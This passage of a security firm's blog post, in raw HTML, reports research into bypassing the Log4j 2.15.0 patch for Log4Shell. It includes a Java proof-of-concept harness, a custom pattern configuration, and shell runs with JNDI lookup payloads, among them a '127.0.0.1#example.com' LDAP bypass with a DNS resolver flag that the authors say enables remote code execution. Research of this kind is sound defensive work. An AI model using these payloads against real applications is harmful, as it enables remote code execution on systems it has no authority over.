          <span class="n">setHostName</span><span class="o">(</span><span class="n">address</span><span class="o">,</span> <span class="n">localIps</span><span class="o">);</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="kd">final</span> <span class="nc">SocketException</span> <span class="n">se</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// ignore.</span>
  <span class="o">}</span>
  <span class="k">return</span> <span class="n">localIps</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<h2 id="testing-assumptions">Testing Assumptions</h2>

<p>At this point, we had some assumptions as to what the patch has introduced. We decided to go ahead and try to confirm this with a practical test.</p>

<p>First, we modified the payload we wrote in our previous blog, to something easier to use:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">POC</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="nc">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="no">POC</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">){</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Using payload: "</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"No payload provided..."</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>After that we compiled it and ran it:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/javac <span class="nt">-cp</span> apache-log4j-2.15.0-bin/log4j-core-2.15.0.jar:apache-log4j-2.15.0-bin/log4j-api-2.15.0.jar POC.java 
user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/java <span class="nt">-cp</span> apache-log4j-2.15.0-bin/log4j-core-2.15.0.jar:apache-log4j-2.15.0-bin/log4j-api-2.15.0.jar:. POC <span class="s1">'${jndi:dns://test.example.com}'</span>
Using payload: <span class="k">${</span><span class="nv">jndi</span>:dns://test.example.com<span class="k">}</span>
15:06:32.118 <span class="o">[</span>main] ERROR POC - <span class="k">${</span><span class="nv">jndi</span>:dns://test.example.com<span class="k">}</span>
</code></pre></div></div>

<p>While we were not expecting to be seeing a DNS request in <code class="language-plaintext highlighter-rouge">wireshark</code>, there had to be at least an error indicating that our protocol and host were wrong, but there was nothing there.</p>

<p>Our assumption was wrong – there had to be more changes that we were not aware of. We tried with “log4j2.formatMsgNoLookups=true”, as this was mentioned in the patch, but it didn’t change anything. There was no DNS or TCP outbound or any additional errors. Because of this we went back to the documentation and stumbled on this:</p>

<p>Pattern layout no longer enables lookups within message text by default for cleaner API boundaries and reduced formatting overhead. The old ‘log4j2.formatMsgNoLookups’ which enabled this behavior has been removed as well as the ‘nolookups’ message pattern converter option. The old behavior can be enabled on a per-pattern basis using ‘%m{lookups}’.</p>

<p>A quick check with meld to <code class="language-plaintext highlighter-rouge">/log4j-core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java</code> revealed that there no longer was a flag that we can enable for lookups unless the option was included in the config file.</p>

<p>With this in mind, we had to create a config file with a custom pattern and use it:</p>

<ul>
  <li>Create a log4j2.xml configuration file in the same folder as the POC code.</li>
</ul>

<pre><code class="language-markup">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;Configuration status="WARN"&gt;
    &lt;Appenders&gt;
        &lt;Console name="Console" target="SYSTEM_OUT"&gt;
        &lt;PatternLayout pattern="%d{HH:mm:ss.SSS} - $${ctx:myContext} - %msg%n" /&gt;
        &lt;/Console&gt;
    &lt;/Appenders&gt;
    &lt;Loggers&gt;
        &lt;Root level="error"&gt;
            &lt;AppenderRef ref="Console"/&gt;
        &lt;/Root&gt;
    &lt;/Loggers&gt;
&lt;/Configuration&gt;
</code></pre>

<ul>
  <li>Modify the POC code to use the new context variable:</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.ThreadContext</span><span class="o">;</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">POC</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="nc">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="no">POC</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">){</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Using payload: "</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
        <span class="nc">ThreadContext</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"myContext"</span><span class="o">,</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"No payload provided..."</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>With these changes, we decided to test again with a slightly modified payload:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/java <span class="nt">-cp</span> log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. POC <span class="s1">'${jndi:ldap://example.com/a'</span><span class="o">}</span>
Using payload: <span class="k">${</span><span class="nv">jndi</span>:ldap://example.com/a<span class="k">}</span>
2021-12-27 16:27:49,981 main WARN Attempt to access ldap server not <span class="k">in </span>allowed list
16:27:49.976 - <span class="k">${</span><span class="nv">jndi</span>:ldap://example.com/a<span class="k">}</span> - <span class="k">${</span><span class="nv">jndi</span>:ldap://example.com/a<span class="k">}</span>
</code></pre></div></div>

<p>We then ran it again to verify that we can use the other enabled protocols as well:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/java <span class="nt">-cp</span> log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. POC <span class="s1">'${java:version}'</span>
Using payload: <span class="k">${</span><span class="nv">java</span>:version<span class="k">}</span>
17:31:52.159 - Java version 1.8.0_171 - <span class="k">${</span><span class="nv">java</span>:version<span class="k">}</span>
</code></pre></div></div>

<p>At this point we knew that we are reaching the lookup function and it just became a matter of bypassing the newly introduced checks.</p>

<h2 id="final-challenge">Final Challenge</h2>

<p>We reached a big problem as the <a href="https://twitter.com/marcioalm/status/1471740771581652995">bypass</a> we saw on Twitter <code class="language-plaintext highlighter-rouge">${jndi:ldap://127.0.0.1#example.com/a}</code> was not working for us. The application was crashing, complaining that it cannot resolve the host due to # in the domain. To go around this, we had to use a different DNS resolver which was not so picky about the special characters.</p>

<p>Here we have a PoC of this:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/java <span class="nt">-cp</span> log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. <span class="se">\</span>
<span class="o">&gt;</span> <span class="nt">-Dsun</span>.net.spi.nameservice.provider.1<span class="o">=</span>dns,sun POC <span class="s1">'${jndi:ldap://127.0.0.1#example.com/a}'</span>
Using payload: <span class="k">${</span><span class="nv">jndi</span>:ldap://127.0.0.1#example.com/a<span class="k">}</span>
2021-12-24 02:45:36,290 main WARN Error looking up JNDI resource <span class="o">[</span>ldap://127.0.0.1#example.com/a]. javax.naming.CommunicationException: 127.0.0.1#example.com:389 <span class="o">[</span>Root exception is java.net.UnknownHostException: 127.0.0.1#example.com]
<span class="o">[</span>...snip...]
</code></pre></div></div>

<p><img src="/assets/images/posts/image-21.png" alt="" /></p>

<p>With this, we were able to reproduce the attack and once again be in a position to achieve RCE.</p>

<p>Our research concluded that several important requirements have to be present to be able to bypass the patch of 2.15.0. The most important ones being 1) the ability to write within a context that 2) is used within a custom pattern in an application 3) using a broad DNS resolver.</p>
</article><div class="post__nav-wrapper">
        <h3 class="post__nav-heading">More articles</h3>

        <div class="post__nav"><a
            class="post__nav-item post__nav-item--prev"
            href="/logging-raw-http-requests-in-python/"
          >Logging Raw HTTP Requests in Python</a><a
            class="post__nav-item post__nav-item--next"
            href="/building-a-research-environment-for-log4j/"
          >Building a Research Environment for Log4j</a></div>
      </div></div>
  </section>
</section><div id="lightbox" class="lightbox opacity-0 z_-10">
    <figure id="lightbox-figure" class="lightbox__figure">
        <img src="" alt="" class="lightbox__img">
        <figcaption class="lightbox__caption"></figcaption>
        <svg id="close-lightbox-control" class="lightbox__close" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24"><path d="M18 6 6 18M6 6l12 12"/></svg>
    </figure>
</div>
    </main><footer class="site-footer">
    <div class="container">

        <div class="site-footer__logo-wrapper">
            <a href="/" class="site-footer__logo-link">
                <img class="site-footer__logo" src="/assets/images/secario-labs-logo.png" alt="Secario Labs logo" width="462" height="58">
            </a>
        </div>

        <div class="site-footer__cols site-footer__cols--3">

            <div class="site-footer__col site-footer__col--desc">

                <div class="site-footer__desc">
                    <p>Secario Labs offers expertly delivered cyber security services, security testing and solutions that are geared to your risk profile and security needs. Combining skills, experience and methodologies to provide offensive cyber security solutions.</p>

                </div>
            </div>

            <div class="site-footer__col site-footer__col--location">
                <p>
                    <strong>Bulgaria Office</strong><br>
                    66 Vitosha Blvd.<br>Sofia, 1463<br>Bulgaria
                </p>
                <p>
                    <a class="site-footer__link" href="tel:+359882357332">
                        +359 882 357332
                    </a>
                    <br>
                    <a class="site-footer__link" href="mailto:info@secariolabs.com">
                        info@secariolabs.com
                    </a>
                </p>
            </div>

            <div class="site-footer__col site-footer__col--location">
                <p>
                    <strong>UK Office</strong><br>
                    Worth Corner, Pound Hill,<br>Crawley, RH10 7SL<br>United Kingdom
                </p>
                <p>
                    <a class="site-footer__link" href="tel:+447389796754">
                        +44 7389 796754
                    </a>
                    <br>
                    <a class="site-footer__link" href="mailto:info@secariolabs.com">
                        info@secariolabs.com
                    </a>
                </p>                
            </div>

        </div>

        <div class="site-footer__cols site-footer__cols--2">
            <div class="site-footer__col">
                <label class="site-footer__form-label" for="email">Sign up to our newsletter</label><div id="mc_embed_shell">
    <link href="//cdn-images.mailchimp.com/embedcode/classic-061523.css" rel="stylesheet" type="text/css">
    <div id="mc_embed_signup">
        <form action="https://secariolabs.us6.list-manage.com/subscribe/post?u=daf217615566079f0ccc22426&amp;id=9fa5ad3243&amp;f_id=002628e3f0" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank">
            <div id="mc_embed_signup_scroll" class="site-footer__form-fields">
                <input type="email" name="EMAIL" class="required email input__text input__text--xl" id="mce-EMAIL" required="" value="" placeholder="Your email">
                <div style="position: absolute; left: -5000px;" aria-hidden="true">
                    <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups -->
                    <input type="text" name="b_daf217615566079f0ccc22426_9fa5ad3243" tabindex="-1" value="">
                </div>
                <div class="optionalParent">
                    <div class="clear foot">
                        <input type="submit" name="subscribe" id="mc-embedded-subscribe" class="site-footer__form-submit btn btn--xl btn--light uppercase" value="Subscribe"></div>
                </div>
            </div>

            <div id="mce-responses" class="clear foot">
                <div class="response" id="mce-error-response" style="display: none;">😐 Error!</div>
                <div class="response" id="mce-success-response" style="display: none;">✅ Success!</div>
            </div>
        </form>
    </div>
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/mc-validate.js"></script>
    <script type="text/javascript">
        (function($) {
            window.fnames = new Array();
            window.ftypes = new Array();
            fnames[0] = 'EMAIL';
            ftypes[0] = 'email';
            fnames[1] = 'FNAME';
            ftypes[1] = 'text';
            fnames[2] = 'LNAME';
            ftypes[2] = 'text';
            fnames[3] = 'ADDRESS';
            ftypes[3] = 'address';
            fnames[4] = 'PHONE';
            ftypes[4] = 'phone';
            fnames[5] = 'BIRTHDAY';
            ftypes[5] = 'birthday';
        }(jQuery));
        var $mcj = jQuery.noConflict(true);
    </script>
</div></div>
            <div class="site-footer__col">
                <h3 class="site-footer__social-heading">
                    Connect With Us
                </h3>
                <div class="site-footer__social">
                    <a href="https://www.linkedin.com/company/secariolabs" class="site-footer__social-item" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true" viewBox="0 0 24 24"><path d="M19.7 3H4.3A1.3 1.3 0 0 0 3 4.3v15.4A1.3 1.3 0 0 0 4.3 21h15.4a1.3 1.3 0 0 0 1.3-1.3V4.3A1.3 1.3 0 0 0 19.7 3zM8.339 18.338H5.667v-8.59h2.672v8.59zM7.004 8.574a1.548 1.548 0 1 1-.002-3.096 1.548 1.548 0 0 1 .002 3.096zm11.335 9.764H15.67v-4.177c0-.996-.017-2.278-1.387-2.278-1.389 0-1.601 1.086-1.601 2.206v4.249h-2.667v-8.59h2.559v1.174h.037c.356-.675 1.227-1.387 2.526-1.387 2.703 0 3.203 1.779 3.203 4.092v4.711z"/></svg></a>
                    <a href="https:/x.com/SecarioLabs" class="site-footer__social-item" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16"><path d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z"/></svg></a>
                    <a href="mailto:info@secariolabs.com" class="site-footer__social-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true" viewBox="0 0 24 24"><path d="M19 5H5c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm.5 12c0 .3-.2.5-.5.5H5c-.3 0-.5-.2-.5-.5V9.8l7.5 5.6 7.5-5.6V17zm0-9.1L12 13.6 4.5 7.9V7c0-.3.2-.5.5-.5h14c.3 0 .5.2.5.5v.9z"/></svg></a>
                    
                </div>
            </div>
        </div>

        <div class="site-footer__bottom">
            <span class="site-footer__bottom-item">All content © 2024 Secario Labs
                    </span><a class="site-footer__bottom-item site-footer__link" href="/privacy-policy/">Privacy Policy</a><a class="site-footer__bottom-item site-footer__link" href="/modern-slavery-policy/">Modern Slavery Policy</a><a class="site-footer__bottom-item site-footer__link" href="/contact/">Contact</a>
        </div>

    </div>
</footer><div id="modal" class="lightbox modal opacity-0 z_-10" data-i_frame="https://outlook.office365.com/owa/calendar/SecarioLabs@secariolabs.com/bookings/">
    <div class="modal__container">
        <div class="modal__content-container">
            <iframe src='' width='100%' height='100%' scrolling='yes' style='border:0'></iframe>
        </div>
        <svg id="close-modal-control" class="lightbox__close modal__close" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24"><path d="M18 6 6 18M6 6l12 12"/></svg>
    </div>
</div><script src="/assets/js/slidetoggle.js"></script><script src="/assets/js/prism.js"></script><script src="/assets/js/scripts.js"></script><script>function handle_lightbox(figure_elements, element_type){

    const lightbox = document.getElementById('lightbox');
    const lightbox_img = lightbox.querySelector('img');
    const lightbox_caption = lightbox.querySelector('figcaption');
    const figures = document.querySelectorAll(figure_elements);
    const the_figure = document.getElementById('lightbox-figure');
    const close_control = document.getElementById('close-lightbox-control');
    const the_body = document.querySelector('body');

    let the_img;
    let the_caption = '';
    
    function open_figure(e){
        const $this = e.currentTarget;

        if(element_type === 'figure'){
            the_img = $this.querySelector('img');
            if($this.querySelector('figcaption')){
                the_caption = $this.querySelector('figcaption').innerHTML;
                lightbox_caption.classList.add('py-0_5rem');
                lightbox_caption.classList.add('px-1rem');
            } else {
                the_caption = '';
            }

        } else if(element_type === 'img'){
            the_img = $this;
        }

        const the_src = the_img.src;

        the_body.classList.add('no-scroll');

        lightbox_img.src = the_src;
        lightbox_caption.innerHTML = the_caption;

        lightbox.classList.remove('z_-10');
        lightbox.classList.remove('opacity-0');
        lightbox.classList.add('opacity-1');

        the_figure.classList.add('translate-y-0');
    }
    
    function close_figure(){
        lightbox_img.src = '';
        lightbox_caption.innerHTML = '';

        the_body.classList.remove('no-scroll');

        lightbox_caption.classList.remove('py-0_5rem');
        lightbox_caption.classList.remove('px-1rem');

        the_figure.classList.remove('translate-y-0');

        lightbox.classList.remove('opacity-1');
        lightbox.classList.add('opacity-0');
        lightbox.classList.add('z_-10');
    }

    figures.forEach(function(el){
        el.addEventListener('click', open_figure);
    });

    close_control.addEventListener('click', close_figure);

    document.addEventListener('click', function(e){
        if(e.target.id === 'lightbox'){
            close_figure();
        }
    });

    window.addEventListener('keydown', keyPress);
    
    function keyPress (e) {
        if(e.key === "Escape") {
            close_figure();
        }
    }

}handle_lightbox('article.post p:has(img:only-of-type) img', 'img');
    </script><script>function handle_modal(){

    const modal = document.getElementById('modal');
    const the_container = modal.querySelector('.modal__container');
    const close_control = document.getElementById('close-modal-control');
    const the_body = document.querySelector('body');
    const iframe_url = modal.dataset.i_frame;
    const the_iframe = modal.querySelector('iframe');
    
    function open_modal(){

        the_iframe.src = iframe_url;

        the_body.classList.add('no-scroll');

        modal.classList.remove('z_-10');
        modal.classList.remove('opacity-0');
        modal.classList.add('opacity-1');

        the_container.classList.add('translate-y-0');
    }
    
    function close_modal(){

        the_iframe.src = '';
        
        the_body.classList.remove('no-scroll');

        the_container.classList.remove('translate-y-0');

        modal.classList.remove('opacity-1');
        modal.classList.add('opacity-0');
        modal.classList.add('z_-10');
    }

    close_control.addEventListener('click', close_modal);

    document.addEventListener('click', function(e){
        if(e.target.id === 'modal'){
            close_modal();
        }
    });

    window.addEventListener('keydown', keyPress);
    
    function keyPress (e) {
        if(e.key === "Escape") {
            close_modal();
        }
    }

    document.querySelectorAll('[data-open-modal]').forEach(function(el){
        el.addEventListener('click', function(e){
            e.preventDefault();
            open_modal();
        });
    });

}

handle_modal()</script></body>

</html>
